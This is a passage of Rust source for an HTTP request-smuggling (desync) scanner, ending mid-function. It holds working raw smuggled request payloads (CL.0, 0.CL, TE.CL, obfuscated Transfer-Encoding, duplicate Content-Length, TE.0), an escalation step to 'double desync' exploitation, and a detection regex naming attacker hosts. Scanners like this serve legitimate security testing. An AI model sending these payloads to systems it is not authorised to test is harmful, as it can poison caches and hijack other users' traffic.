// File: desync_scanner.rs
// SPDX-License-Identifier: MIT OR Apache-2.0
//
// Copyright (c) 2023-2025
// - Volker Schwaberow <volker@schwaberow.de>

use log::{debug, info, trace, warn};
use lru::LruCache;
use once_cell::sync::Lazy;
use regex::Regex;
use serde::{Deserialize, Serialize};
use std::collections::{HashMap, HashSet};
use std::num::NonZeroUsize;
use std::sync::Arc;
use std::time::{Duration, Instant};
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;
use tokio::sync::Semaphore;

static CONTAMINATION_PATTERNS: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r"(?i)(x-evil|x-injected|evil\.com|attacker\.com|malicious\.net)").unwrap()
});

static CACHE_INDICATORS: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r"(?i)(x-cache|cf-cache-status|x-served-by|x-cache-hits|age|expires|cache-control)")
        .unwrap()
});

static TIMING_ATTACK_PATTERNS: Lazy<HashSet<&'static str>> = Lazy::new(|| {
    let mut set = HashSet::new();
    set.insert("Connection: keep-alive");
    set.insert("Transfer-Encoding: chunked");
    set.insert("Expect: 100-continue");
    set.insert("Content-Length: 0");
    set
});

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq, Hash, PartialOrd, Ord)]
pub enum DesyncSeverity {
    Critical,
    High,
    Medium,
    Low,
    Info,
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
pub enum DesyncType {
    CL0,
    ZeroCL,
    DoubleDesync,
    Tecl,
    TEObfuscation,
    TE0,
    DuplicateCL,
    ObsoleteLinefolding,
    ChunkEdgeCases,
    ChunkExtensions,
    Expect100,
    HeaderSmuggling,
    HeaderCaseSensitivity,
    HTTP2Downgrade,
    ConnectionReuse,
    CachePoisoning,
    ParserDiscrepancy,
    TimingAnomaly,
    IntermediateProxy,
    VisibilityFlip,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum DesyncSignal {
    ResponseContamination {
        marker: String,
    },
    SplitError {
        status: u16,
        headers: Vec<String>,
    },
    Continue100 {
        unexpected: bool,
    },
    TimingAnomaly {
        delay_ms: u64,
        baseline_ms: u64,
    },
    ConnectionClose {
        forced: bool,
    },
    ParserDiscrepancy {
        frontend: String,
        backend: String,
    },
    CacheContamination {
        cache_key: String,
        poisoned_value: String,
    },
    HeaderCaseModification {
        original: String,
        modified: String,
    },
    ChunkExtensionInjection {
        extension: String,
    },
    HTTP2ProtocolDowngrade {
        h2_supported: bool,
        fallback_behavior: String,
    },
    ConnectionReuseAnomaly {
        expected_reuse: bool,
        actual_reuse: bool,
    },
    ProxyBehaviorDiscrepancy {
        proxy_response: String,
        direct_response: String,
    },
    UnexpectedResponseLength {
        expected: usize,
        actual: usize,
    },
    StatusCodeDiscrepancy {
        first_response: u16,
        second_response: u16,
    },
}

#[derive(Debug, Clone)]
pub struct DesyncConfig {
    pub safe_mode: bool,
    pub max_body_size: usize,
    pub connect_timeout: Duration,
    pub read_timeout: Duration,
    pub reuse_connections: bool,
    pub rate_limit_per_host: u32,
    pub retry_on_idle_close: u8,
    pub canary_prefix: String,
    pub collaborator_url: Option<String>,
    pub max_targets: usize,
    pub enable_timing_analysis: bool,
    pub timing_samples: usize,
    pub timing_threshold_ms: u64,
    pub enable_connection_pooling: bool,
    pub max_connections_per_host: usize,
    pub enable_cache_probing: bool,
    pub enable_h2_downgrade_tests: bool,
    pub enable_advanced_chunking: bool,
    pub enable_non_poisoning_mode: bool,
    pub timeout_only_patterns: bool,
    pub parser_fingerprint_payloads: Vec<String>,
}

impl Default for DesyncConfig {
    fn default() -> Self {
        Self {
            safe_mode: true,
            max_body_size: 8192,
            connect_timeout: Duration::from_millis(3000),
            read_timeout: Duration::from_millis(8000),
            reuse_connections: true,
            rate_limit_per_host: 120,
            retry_on_idle_close: 1,
            canary_prefix: "rpd".to_string(),
            collaborator_url: None,
            max_targets: 10000,
            enable_timing_analysis: true,
            timing_samples: 3,
            timing_threshold_ms: 500,
            enable_connection_pooling: true,
            max_connections_per_host: 3,
            enable_cache_probing: false,
            enable_h2_downgrade_tests: false,
            enable_advanced_chunking: true,
            enable_non_poisoning_mode: true,
            timeout_only_patterns: true,
            parser_fingerprint_payloads: vec![
                "X-Forwarded-For: 127.0.0.1".to_string(),
                "X-Real-IP: 192.168.1.1".to_string(),
                "Via: 1.1 proxy".to_string(),
            ],
        }
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DesyncResult {
    pub url: String,
    pub test_type: DesyncType,
    pub severity: DesyncSeverity,
    pub signals: Vec<DesyncSignal>,
    pub request_fingerprint: String,
    pub response_status: u16,
    pub contamination_marker: Option<String>,
    pub timing_ms: u64,
    pub via_header: Option<String>,
    pub alt_svc: Option<String>,
    pub evidence: DesyncEvidence,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DesyncEvidence {
    pub raw_request: String,
    pub raw_response: String,
    pub connection_reused: bool,
    pub server_header: Option<String>,
    pub response_headers: HashMap<String, String>,
    pub body_snippet: Option<String>,
    pub timing_data: TimingData,
    pub connection_fingerprint: Option<String>,
    pub parser_behavior: Option<ParserBehavior>,
    pub differential_responses: Vec<DifferentialResponse>,
    pub cache_indicators: Vec<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TimingData {
    pub baseline_ms: u64,
    pub actual_ms: u64,
    pub samples: Vec<u64>,
    pub anomaly_detected: bool,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ParserBehavior {
    pub accepts_duplicate_headers: bool,
    pub header_case_sensitivity: bool,
    pub chunk_extension_handling: String,
    pub te_cl_precedence: String,
    pub connection_header_behavior: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DifferentialResponse {
    pub test_name: String,
    pub response_a: String,
    pub response_b: String,
    pub difference_detected: bool,
    pub difference_type: String,
}

#[derive(Debug, Clone)]
struct ConnectionPool {
    connections: HashMap<String, Vec<PooledConnection>>,
    max_per_host: usize,
    circuit_breakers: HashMap<String, CircuitBreakerState>,
}

#[derive(Debug, Clone)]
struct CircuitBreakerState {
    failure_count: u32,
    last_failure: Instant,
    state: CircuitState,
}

#[derive(Debug, Clone, PartialEq)]
enum CircuitState {
    Closed,
    Open,
    HalfOpen,
}

#[derive(Debug, Clone)]
struct PooledConnection {
    stream: Arc<tokio::sync::Mutex<Option<TcpStream>>>,
    last_used: Instant,
    reuse_count: usize,
}

pub struct DesyncScanner {
    config: DesyncConfig,
    client: reqwest::Client,
    semaphore: Arc<Semaphore>,
    connection_pool: Arc<tokio::sync::Mutex<ConnectionPool>>,
    baseline_timings: Arc<tokio::sync::Mutex<LruCache<String, u64>>>,
}

impl ConnectionPool {
    fn new(max_per_host: usize) -> Self {
        Self {
            connections: HashMap::new(),
            max_per_host,
            circuit_breakers: HashMap::new(),
        }
    }

    fn is_circuit_open(&mut self, host: &str) -> bool {
        if let Some(breaker) = self.circuit_breakers.get_mut(host) {
            match breaker.state {
                CircuitState::Open => {
                    if breaker.last_failure.elapsed() > Duration::from_secs(30) {
                        breaker.state = CircuitState::HalfOpen;
                        false
                    } else {
                        true
                    }
                }
                _ => false,
            }
        } else {
            false
        }
    }

    fn record_failure(&mut self, host: &str) {
        let breaker = self
            .circuit_breakers
            .entry(host.to_string())
            .or_insert_with(|| CircuitBreakerState {
                failure_count: 0,
                last_failure: Instant::now(),
                state: CircuitState::Closed,
            });

        breaker.failure_count += 1;
        breaker.last_failure = Instant::now();

        if breaker.failure_count >= 3 {
            breaker.state = CircuitState::Open;
        }
    }

    fn record_success(&mut self, host: &str) {
        if let Some(breaker) = self.circuit_breakers.get_mut(host) {
            if breaker.state == CircuitState::HalfOpen {
                breaker.state = CircuitState::Closed;
                breaker.failure_count = 0;
            }
        }
    }

    async fn get_connection(&mut self, host: &str) -> Option<PooledConnection> {
        if self.is_circuit_open(host) {
            return None;
        }

        if let Some(connections) = self.connections.get_mut(host) {
            while let Some(conn) = connections.pop() {
                if conn.last_used.elapsed() < Duration::from_secs(20)
                    && conn.reuse_count < 5
                    && Self::is_connection_healthy(&conn).await
                {
                    return Some(conn);
                }
            }
        }
        None
    }

    async fn is_connection_healthy(conn: &PooledConnection) -> bool {
        match conn.stream.try_lock() {
            Ok(stream_guard) => {
                if let Some(stream) = stream_guard.as_ref() {
                    stream.peer_addr().is_ok()
                } else {
                    false
                }
            }
            Err(_) => false,
        }
    }

    fn return_connection(&mut self, host: &str, mut conn: PooledConnection) {
        conn.last_used = Instant::now();
        conn.reuse_count += 1;

        let connections = self.connections.entry(host.to_string()).or_default();
        if connections.len() < self.max_per_host {
            connections.push(conn);
        }
    }
}

impl DesyncScanner {
    pub fn new(mut config: DesyncConfig) -> Result<Self, Box<dyn std::error::Error + Send + Sync>> {
        Self::validate_config(&mut config)?;
        let client = reqwest::Client::builder()
            .connect_timeout(config.connect_timeout)
            .timeout(config.read_timeout)
            .pool_idle_timeout(Duration::from_secs(30))
            .pool_max_idle_per_host(2)
            .redirect(reqwest::redirect::Policy::none())
            .user_agent("rprobe-desync/1.0")
            .build()?;

        let semaphore = Arc::new(Semaphore::new(16));
        let connection_pool = Arc::new(tokio::sync::Mutex::new(ConnectionPool::new(
            config.max_connections_per_host,
        )));
        let baseline_timings = Arc::new(tokio::sync::Mutex::new(LruCache::new(
            NonZeroUsize::new(1000).unwrap(),
        )));

        Ok(Self {
            config,
            client,
            semaphore,
            connection_pool,
            baseline_timings,
        })
    }

    pub async fn scan_target(
        &self,
        target_url: &str,
    ) -> Result<Vec<DesyncResult>, Box<dyn std::error::Error + Send + Sync>> {
        info!("Starting comprehensive desync scan for: {}", target_url);
        debug!("Desync scanner config: timing_analysis={}, advanced_chunking={}, h2_downgrade={}, cache_probing={}, non_poisoning={}",
               self.config.enable_timing_analysis,
               self.config.enable_advanced_chunking,
               self.config.enable_h2_downgrade_tests,
               self.config.enable_cache_probing,
               self.config.enable_non_poisoning_mode);

        let mut results = Vec::new();

        debug!("Discovering server capabilities for: {}", target_url);
        if let Ok(discovery) = self.discover_capabilities(target_url).await {
            debug!("Server capabilities discovered: {:?}", discovery);
        } else {
            debug!("Failed to discover server capabilities");
        }

        if self.config.enable_timing_analysis {
            debug!("Establishing timing baseline for: {}", target_url);
            if let Err(e) = self.establish_timing_baseline(target_url).await {
                debug!("Failed to establish timing baseline: {}", e);
            } else {
                trace!("Timing baseline established successfully");
            }
        }

        debug!("Starting desync attack vector tests for: {}", target_url);
        trace!("Running ZeroCL attack test");
        match self.test_zero_cl(target_url).await {
            Ok(mut test_results) => {
                debug!("ZeroCL test completed: {} results", test_results.len());
                for result in &mut test_results {
                    result.test_type = DesyncType::ZeroCL;
                }
                results.extend(test_results);
            }
            Err(e) => debug!("ZeroCL test failed for {}: {}", target_url, e),
        }
        tokio::time::sleep(Duration::from_millis(50)).await;

        match self.test_cl0(target_url).await {
            Ok(mut test_results) => {
                for result in &mut test_results {
                    result.test_type = DesyncType::CL0;
                }
                results.extend(test_results);
            }
            Err(e) => warn!("CL0 test failed for {}: {}", target_url, e),
        }
        tokio::time::sleep(Duration::from_millis(50)).await;

        match self.test_te_cl(target_url).await {
            Ok(mut test_results) => {
                for result in &mut test_results {
                    result.test_type = DesyncType::Tecl;
                }
                results.extend(test_results);
            }
            Err(e) => warn!("Tecl test failed for {}: {}", target_url, e),
        }
        tokio::time::sleep(Duration::from_millis(50)).await;

        match self.test_te_obfuscation(target_url).await {
            Ok(mut test_results) => {
                for result in &mut test_results {
                    result.test_type = DesyncType::TEObfuscation;
                }
                results.extend(test_results);
            }
            Err(e) => warn!("TE Obfuscation test failed for {}: {}", target_url, e),
        }
        tokio::time::sleep(Duration::from_millis(50)).await;

        match self.test_te_zero(target_url).await {
            Ok(mut test_results) => {
                for result in &mut test_results {
                    result.test_type = DesyncType::TE0;
                }
                results.extend(test_results);
            }
            Err(e) => warn!("TE.0 test failed for {}: {}", target_url, e),
        }
        tokio::time::sleep(Duration::from_millis(50)).await;

        match self.test_duplicate_cl(target_url).await {
            Ok(mut test_results) => {
                for result in &mut test_results {
                    result.test_type = DesyncType::DuplicateCL;
                }
                results.extend(test_results);
            }
            Err(e) => warn!("Duplicate CL test failed for {}: {}", target_url, e),
        }
        tokio::time::sleep(Duration::from_millis(50)).await;

        match self.test_header_case_sensitivity(target_url).await {
            Ok(mut test_results) => {
                for result in &mut test_results {
                    result.test_type = DesyncType::HeaderCaseSensitivity;
                }
                results.extend(test_results);
            }
            Err(e) => warn!(
                "Header case sensitivity test failed for {}: {}",
                target_url, e
            ),
        }
        tokio::time::sleep(Duration::from_millis(50)).await;

        match self.test_connection_reuse_exploitation(target_url).await {
            Ok(mut test_results) => {
                for result in &mut test_results {
                    result.test_type = DesyncType::ConnectionReuse;
                }
                results.extend(test_results);
            }
            Err(e) => warn!("Connection reuse test failed for {}: {}", target_url, e),
        }
        tokio::time::sleep(Duration::from_millis(50)).await;

        match self.test_parser_discrepancy(target_url).await {
            Ok(mut test_results) => {
                for result in &mut test_results {
                    result.test_type = DesyncType::ParserDiscrepancy;
                }
                results.extend(test_results);
            }
            Err(e) => warn!("Parser discrepancy test failed for {}: {}", target_url, e),
        }
        tokio::time::sleep(Duration::from_millis(50)).await;

        if self.config.enable_advanced_chunking {
            match self.test_chunk_edge_cases(target_url).await {
                Ok(mut test_results) => {
                    for result in &mut test_results {
                        result.test_type = DesyncType::ChunkEdgeCases;
                    }
                    results.extend(test_results);
                }
                Err(e) => warn!("Chunk edge cases test failed for {}: {}", target_url, e),
            }
            tokio::time::sleep(Duration::from_millis(50)).await;

            match self.test_chunk_extensions(target_url).await {
                Ok(mut test_results) => {
                    for result in &mut test_results {
                        result.test_type = DesyncType::ChunkExtensions;
                    }
                    results.extend(test_results);
                }
                Err(e) => warn!("Chunk extensions test failed for {}: {}", target_url, e),
            }
            tokio::time::sleep(Duration::from_millis(50)).await;
        }

        if self.config.enable_h2_downgrade_tests {
            match self.test_http2_downgrade(target_url).await {
                Ok(mut test_results) => {
                    for result in &mut test_results {
                        result.test_type = DesyncType::HTTP2Downgrade;
                    }
                    results.extend(test_results);
                }
                Err(e) => warn!("HTTP/2 downgrade test failed for {}: {}", target_url, e),
            }
            tokio::time::sleep(Duration::from_millis(50)).await;
        }

        if self.config.enable_cache_probing {
            match self.test_cache_poisoning(target_url).await {
                Ok(mut test_results) => {
                    for result in &mut test_results {
                        result.test_type = DesyncType::CachePoisoning;
                    }
                    results.extend(test_results);
                }
                Err(e) => warn!("Cache poisoning test failed for {}: {}", target_url, e),
            }
            tokio::time::sleep(Duration::from_millis(50)).await;
        }

        match self.test_obsolete_linefolding(target_url).await {
            Ok(mut test_results) => {
                for result in &mut test_results {
                    result.test_type = DesyncType::ObsoleteLinefolding;
                }
                results.extend(test_results);
            }
            Err(e) => warn!("Obsolete linefolding test failed for {}: {}", target_url, e),
        }
        tokio::time::sleep(Duration::from_millis(50)).await;

        match self.test_expect_100(target_url).await {
            Ok(mut test_results) => {
                for result in &mut test_results {
                    result.test_type = DesyncType::Expect100;
                }
                results.extend(test_results);
            }
            Err(e) => warn!("Expect 100 test failed for {}: {}", target_url, e),
        }
        tokio::time::sleep(Duration::from_millis(50)).await;

        match self.test_header_smuggling(target_url).await {
            Ok(mut test_results) => {
                for result in &mut test_results {
                    result.test_type = DesyncType::HeaderSmuggling;
                }
                results.extend(test_results);
            }
            Err(e) => warn!("Header smuggling test failed for {}: {}", target_url, e),
        }
        tokio::time::sleep(Duration::from_millis(50)).await;

        match self.test_visibility_flip(target_url).await {
            Ok(mut test_results) => {
                for result in &mut test_results {
                    result.test_type = DesyncType::VisibilityFlip;
                }
                results.extend(test_results);
            }
            Err(e) => warn!(
                "V-H/H-V visibility-flip test failed for {}: {}",
                target_url, e
            ),
        }
        tokio::time::sleep(Duration::from_millis(50)).await;

        if self.config.enable_non_poisoning_mode {
            match self.test_non_poisoning_timeouts(target_url).await {
                Ok(mut test_results) => {
                    for result in &mut test_results {
                        result.test_type = DesyncType::TimingAnomaly;
                    }
                    results.extend(test_results);
                }
                Err(e) => warn!(
                    "Non-poisoning timeout test failed for {}: {}",
                    target_url, e
                ),
            }
            tokio::time::sleep(Duration::from_millis(50)).await;
        }

        if results.iter().any(|r| {
            matches!(r.test_type, DesyncType::ZeroCL) && r.severity >= DesyncSeverity::High
        }) {
            info!("High-severity vulnerabilities detected, attempting advanced exploitation");
            match self.test_double_desync(target_url).await {
                Ok(mut double_desync_results) => {
                    for result in &mut double_desync_results {
                        result.test_type = DesyncType::DoubleDesync;
                    }
                    results.extend(double_desync_results);
                }
                Err(e) => warn!("Double-Desync test failed: {}", e),
            }
        }

        if self.config.enable_timing_analysis {
            match self.perform_timing_analysis(target_url, &results).await {
                Ok(timing_results) => results.extend(timing_results),
                Err(e) => warn!("Timing analysis failed: {}", e),
            }
        }

        debug!("Running SOC detection enhancement");
        self.enhance_soc_detection(&mut results).await;

        let critical = results
            .iter()
            .filter(|r| matches!(r.severity, DesyncSeverity::Critical))
            .count();
        let high = results
            .iter()
            .filter(|r| matches!(r.severity, DesyncSeverity::High))
            .count();
        let medium = results
            .iter()
            .filter(|r| matches!(r.severity, DesyncSeverity::Medium))
            .count();
        let low = results
            .iter()
            .filter(|r| matches!(r.severity, DesyncSeverity::Low))
            .count();
        let info = results
            .iter()
            .filter(|r| matches!(r.severity, DesyncSeverity::Info))
            .count();

        debug!(
            "Desync scan results summary: Critical={}, High={}, Medium={}, Low={}, Info={}",
            critical, high, medium, low, info
        );

        info!(
            "Comprehensive desync scan completed for {}, found {} potential issues",
            target_url,
            results.len()
        );
        Ok(results)
    }

    async fn discover_capabilities(
        &self,
        url: &str,
    ) -> Result<HashMap<String, String>, Box<dyn std::error::Error + Send + Sync>> {
        let mut capabilities = HashMap::new();

        let response = self
            .client
            .request(reqwest::Method::from_bytes(b"OPTIONS")?, url)
            .header("Pragma", "no-cache")
            .send()
            .await?;

        capabilities.insert("status".to_string(), response.status().as_u16().to_string());

        for (name, value) in response.headers() {
            let key = name.as_str().to_lowercase();
            if ["alt-svc", "via", "server", "connection"].contains(&key.as_str()) {
                capabilities.insert(key, value.to_str().unwrap_or("").to_string());
            }
        }

        Ok(capabilities)
    }

    async fn test_zero_cl(
        &self,
        url: &str,
    ) -> Result<Vec<DesyncResult>, Box<dyn std::error::Error + Send + Sync>> {
        let start_time = Instant::now();
        let marker = self.generate_marker();

        let raw_request = format!(
            "POST / HTTP/1.1\r\nHost: {}\r\nContent-Length: 0\r\n\r\nGET /{}-{} HTTP/1.1\r\nHost: {}\r\n\r\n",
            self.extract_host(url)?,
            self.config.canary_prefix,
            marker,
            self.extract_host(url)?
        );

        debug!(
            "Testing 0.CL with request: {}",
            raw_request.replace("\r\n", "\\r\\n")
        );

        let response = self.send_raw_request(url, &raw_request).await?;
        let timing_ms = start_time.elapsed().as_millis() as u64;

        let mut signals = Vec::new();
        let mut severity = DesyncSeverity::Low;

        if self.check_contamination(&response, &marker) {
            signals.push(DesyncSignal::ResponseContamination {
                marker: marker.clone(),
            });
            severity = DesyncSeverity::High;
        }

        if self.is_split_error(&response) {
            signals.push(DesyncSignal::SplitError {
                status: response.status,
                headers: response
                    .headers
                    .iter()
                    .map(|(k, v)| format!("{}: {}", k, v))
                    .collect(),
            });
            if severity < DesyncSeverity::Medium {
                severity = DesyncSeverity::Medium;
            }
        }

        Ok(vec![DesyncResult {
            url: url.to_string(),
            test_type: DesyncType::ZeroCL,
            severity,
            signals,
            request_fingerprint: self.calculate_request_fingerprint(&raw_request),
            response_status: response.status,
            contamination_marker: Some(marker),
            timing_ms,
            via_header: response.headers.get("via").map(|v| v.to_string()),
            alt_svc: response.headers.get("alt-svc").map(|v| v.to_string()),
            evidence: DesyncEvidence {
                raw_request,
                raw_response: response.body.clone(),
                connection_reused: false,
                server_header: response.headers.get("server").map(|v| v.to_string()),
                response_headers: response.headers.clone(),
                body_snippet: Some(response.body[..response.body.len().min(500)].to_string()),
                timing_data: TimingData {
                    baseline_ms: 0,
                    actual_ms: timing_ms,
                    samples: vec![timing_ms],
                    anomaly_detected: false,
                },
                connection_fingerprint: None,
                parser_behavior: None,
                differential_responses: Vec::new(),
                cache_indicators: Vec::new(),
            },
        }])
    }

    async fn test_cl0(
        &self,
        url: &str,
    ) -> Result<Vec<DesyncResult>, Box<dyn std::error::Error + Send + Sync>> {
        let start_time = Instant::now();
        let marker = self.generate_marker();

        let raw_request = format!(
            "POST / HTTP/1.1\r\nHost: {}\r\nContent-Length: 4\r\n\r\nX=1\r\nGET /{}-{} HTTP/1.1\r\nHost: {}\r\n\r\n",
            self.extract_host(url)?,
            self.config.canary_prefix,
            marker,
            self.extract_host(url)?
        );

        let response = self.send_raw_request(url, &raw_request).await?;
        let timing_ms = start_time.elapsed().as_millis() as u64;

        let mut signals = Vec::new();
        let mut severity = DesyncSeverity::Low;

        if self.check_contamination(&response, &marker) {
            signals.push(DesyncSignal::ResponseContamination {
                marker: marker.clone(),
            });
            severity = DesyncSeverity::High;
        }

        if self.is_split_error(&response) {
            signals.push(DesyncSignal::SplitError {
                status: response.status,
                headers: response
                    .headers
                    .iter()
                    .map(|(k, v)| format!("{}: {}", k, v))
                    .collect(),
            });
            if severity < DesyncSeverity::Medium {
                severity = DesyncSeverity::Medium;
            }
        }

        Ok(vec![DesyncResult {
            url: url.to_string(),
            test_type: DesyncType::CL0,
            severity,
            signals,
            request_fingerprint: self.calculate_request_fingerprint(&raw_request),
            response_status: response.status,
            contamination_marker: Some(marker),
            timing_ms,
            via_header: response.headers.get("via").map(|v| v.to_string()),
            alt_svc: response.headers.get("alt-svc").map(|v| v.to_string()),
            evidence: DesyncEvidence {
                raw_request,
                raw_response: response.body.clone(),
                connection_reused: false,
                server_header: response.headers.get("server").map(|v| v.to_string()),
                response_headers: response.headers.clone(),
                body_snippet: Some(response.body[..response.body.len().min(500)].to_string()),
                timing_data: TimingData {
                    baseline_ms: 0,
                    actual_ms: timing_ms,
                    samples: vec![timing_ms],
                    anomaly_detected: false,
                },
                connection_fingerprint: None,
                parser_behavior: None,
                differential_responses: Vec::new(),
                cache_indicators: Vec::new(),
            },
        }])
    }

    async fn test_te_cl(
        &self,
        url: &str,
    ) -> Result<Vec<DesyncResult>, Box<dyn std::error::Error + Send + Sync>> {
        let start_time = Instant::now();
        let marker = self.generate_marker();

        let raw_request = format!(
            "POST / HTTP/1.1\r\nHost: {}\r\nTransfer-Encoding: chunked\r\nContent-Length: 4\r\n\r\n0\r\n\r\nGET /{}-{} HTTP/1.1\r\nHost: {}\r\n\r\n",
            self.extract_host(url)?,
            self.config.canary_prefix,
            marker,
            self.extract_host(url)?
        );

        let response = self.send_raw_request(url, &raw_request).await?;
        let timing_ms = start_time.elapsed().as_millis() as u64;

        let mut signals = Vec::new();
        let mut severity = DesyncSeverity::Low;

        if self.check_contamination(&response, &marker) {
            signals.push(DesyncSignal::ResponseContamination {
                marker: marker.clone(),
            });
            severity = DesyncSeverity::High;
        }

        if self.is_split_error(&response) {
            signals.push(DesyncSignal::SplitError {
                status: response.status,
                headers: vec![],
            });
            if severity < DesyncSeverity::Medium {
                severity = DesyncSeverity::Medium;
            }
        }

        Ok(vec![DesyncResult {
            url: url.to_string(),
            test_type: DesyncType::Tecl,
            severity,
            signals,
            request_fingerprint: self.calculate_request_fingerprint(&raw_request),
            response_status: response.status,
            contamination_marker: Some(marker),
            timing_ms,
            via_header: None,
            alt_svc: None,
            evidence: DesyncEvidence {
                raw_request,
                raw_response: response.body.clone(),
                connection_reused: false,
                server_header: None,
                response_headers: HashMap::new(),
                body_snippet: None,
                timing_data: TimingData {
                    baseline_ms: 0,
                    actual_ms: timing_ms,
                    samples: vec![timing_ms],
                    anomaly_detected: false,
                },
                connection_fingerprint: Some("double_desync".to_string()),
                parser_behavior: None,
                differential_responses: Vec::new(),
                cache_indicators: Vec::new(),
            },
        }])
    }

    async fn test_te_obfuscation(
        &self,
        url: &str,
    ) -> Result<Vec<DesyncResult>, Box<dyn std::error::Error + Send + Sync>> {
        let variations = vec![
            ("Transfer-Encoding", "chunked"),
            ("transfer-encoding", "chunked"),
            ("Transfer-Encoding", "chunked, chunked"),
            ("Transfer-Encoding", "chunked; q=1"),
        ];

        let mut results = Vec::new();

        for (header_name, header_value) in variations {
            let start_time = Instant::now();
            let marker = self.generate_marker();

            let raw_request = format!(
                "POST / HTTP/1.1\r\nHost: {}\r\n{}: {}\r\n\r\n0\r\n\r\nGET /{}-{} HTTP/1.1\r\nHost: {}\r\n\r\n",
                self.extract_host(url)?,
                header_name,
                header_value,
                self.config.canary_prefix,
                marker,
                self.extract_host(url)?
            );

            let response = self.send_raw_request(url, &raw_request).await?;
            let timing_ms = start_time.elapsed().as_millis() as u64;

            let mut signals = Vec::new();
            let mut severity = DesyncSeverity::Low;

            if self.check_contamination(&response, &marker) {
                signals.push(DesyncSignal::ResponseContamination {
                    marker: marker.clone(),
                });
                severity = DesyncSeverity::Medium;
            }

            if self.is_split_error(&response) {
                signals.push(DesyncSignal::SplitError {
                    status: response.status,
                    headers: vec![],
                });
                if severity < DesyncSeverity::Medium {
                    severity = DesyncSeverity::Medium;
                }
            }

            results.push(DesyncResult {
                url: url.to_string(),
                test_type: DesyncType::TEObfuscation,
                severity,
                signals,
                request_fingerprint: self.calculate_request_fingerprint(&raw_request),
                response_status: response.status,
                contamination_marker: Some(marker),
                timing_ms,
                via_header: None,
                alt_svc: None,
                evidence: DesyncEvidence {
                    raw_request,
                    raw_response: response.body.clone(),
                    connection_reused: false,
                    server_header: None,
                    response_headers: HashMap::new(),
                    body_snippet: None,
                    timing_data: TimingData {
                        baseline_ms: 0,
                        actual_ms: timing_ms,
                        samples: vec![timing_ms],
                        anomaly_detected: false,
                    },
                    connection_fingerprint: None,
                    parser_behavior: None,
                    differential_responses: Vec::new(),
                    cache_indicators: Vec::new(),
                },
            });

            tokio::time::sleep(Duration::from_millis(100)).await;
        }

        Ok(results)
    }

    async fn test_duplicate_cl(
        &self,
        url: &str,
    ) -> Result<Vec<DesyncResult>, Box<dyn std::error::Error + Send + Sync>> {
        let start_time = Instant::now();
        let marker = self.generate_marker();

        let raw_request = format!(
            "POST / HTTP/1.1\r\nHost: {}\r\nContent-Length: 4\r\nContent-Length: 11\r\n\r\nX=1\r\nGET /{}-{} HTTP/1.1\r\nHost: {}\r\n\r\n",
            self.extract_host(url)?,
            self.config.canary_prefix,
            marker,
            self.extract_host(url)?
        );

        let response = self.send_raw_request(url, &raw_request).await?;
        let timing_ms = start_time.elapsed().as_millis() as u64;

        let signals = Vec::new();
        let severity = DesyncSeverity::Medium;

        Ok(vec![DesyncResult {
            url: url.to_string(),
            test_type: DesyncType::DuplicateCL,
            severity,
            signals,
            request_fingerprint: self.calculate_request_fingerprint(&raw_request),
            response_status: response.status,
            contamination_marker: Some(marker),
            timing_ms,
            via_header: None,
            alt_svc: None,
            evidence: DesyncEvidence {
                raw_request,
                raw_response: response.body.clone(),
                connection_reused: false,
                server_header: None,
                response_headers: HashMap::new(),
                body_snippet: None,
                timing_data: TimingData {
                    baseline_ms: 0,
                    actual_ms: timing_ms,
                    samples: vec![timing_ms],
                    anomaly_detected: false,
                },
                connection_fingerprint: Some("double_desync".to_string()),
                parser_behavior: None,
                differential_responses: Vec::new(),
                cache_indicators: Vec::new(),
            },
        }])
    }

    async fn test_te_zero(
        &self,
        url: &str,
    ) -> Result<Vec<DesyncResult>, Box<dyn std::error::Error + Send + Sync>> {
        let start_time = Instant::now();
        let marker = self.generate_marker();

        let raw_request = format!(
            "POST / HTTP/1.1\r\nHost: {}\r\nTransfer-Encoding: 0\r\n\r\nGET /{}-{} HTTP/1.1\r\nHost: {}\r\n\r\n",
            self.extract_host(url)?,
            self.config.canary_prefix,
            marker,
            self.extract_host(url)?
        );

        debug!(
            "Testing TE.0 with request: {}",
            raw_request.replace("\r\n", "\\r\\n")
        );

        let response = self.send_raw_request(url, &raw_request).await?;
        let timing_ms = start_time.elapsed().as_millis() as u64;

        let mut signals = Vec::new();
        let mut severity = DesyncSeverity::Low;

        if self.check_contamination(&response, &marker) {
            signals.push(DesyncSignal::ResponseContamination {
                marker: marker.clone(),
            });
            severity = DesyncSeverity::High;
        }

        if response.status == 400 || response.status == 501 {
            signals.push(DesyncSignal::SplitError {
                status: response.status,
                headers: response
                    .headers
                    .iter()
                    .map(|(k, v)| format!("{}: {}", k, v))
                    .collect(),
            });
            if severity < DesyncSeverity::Medium {
                severity = DesyncSeverity::Medium;
            }
        }

        Ok(vec![DesyncResult {
            url: url.to_string(),
            test_type: DesyncType::TE0,
            severity,
            signals,
            request_fingerprint: self.calculate_request_fingerprint(&raw_request),
            response_status: response.status,
            contamination_marker: Some(marker),
            timing_ms,
            via_header: response.headers.get("via").map(|v| v.to_string()),
            alt_svc: response.headers.get("alt-svc").map(|v| v.to_string()),
            evidence: DesyncEvidence {
                raw_request,
                raw_response: response.body.clone(),
                connection_reused: false,
                server_header: response.headers.get("server").map(|v| v.to_string()),
                response_headers: response.headers.clone(),
                body_snippet: Some(response.body[..response.body.len().min(500)].to_string()),
                timing_data: TimingData {
                    baseline_ms: 0,
                    actual_ms: timing_ms,
                    samples: vec![timing_ms],
                    anomaly_detected: false,
                },
                connection_fingerprint: None,
                parser_behavior: None,
                differential_responses: Vec::new(),
                cache_indicators: Vec::new(),
            },
        }])
    }

    async fn test_obsolete_linefolding(
        &self,
        url: &str,
    ) -> Result<Vec<DesyncResult>, Box<dyn std::error::Error + Send + Sync>> {
        let start_time = Instant::now();
        let marker = self.generate_marker();

        let raw_request = format!(
